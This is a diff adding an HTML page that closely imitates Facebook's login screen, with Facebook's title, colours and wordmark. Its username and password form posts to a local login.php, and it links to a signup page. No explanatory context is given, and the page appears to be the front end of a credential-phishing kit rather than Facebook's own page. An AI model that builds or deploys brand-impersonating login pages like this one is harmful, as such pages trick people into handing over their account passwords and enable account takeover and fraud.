@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook – Log In</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Helvetica, Arial, sans-serif;
+      margin: 0;
+    }
+
+    .header {
+      background-color: #1877f2;
+      padding: 18px;
+      color: white;
+      font-size: 30px;
+      font-weight: bold;
+      text-align: center;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      margin: 80px auto;
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+
+    h2 {
+      color: #1877f2;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    input[type="submit"] {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #155ecb;
+    }
+
+    .note {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    .note a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+
+    .note a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+<div class="header">facebook</div>
+
+<div class="container">
+  <h2>Log In to Facebook</h2>
+  <form action="login.php" method="POST">
+    <input type="text" name="username" placeholder="Username" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <input type="submit" value="Log In">
+  </form>
+  <div class="note">
+    Don't have an account? <a href="signup.html">Sign up</a>
+  </div>
+</div>
+
+</body>
+</html>
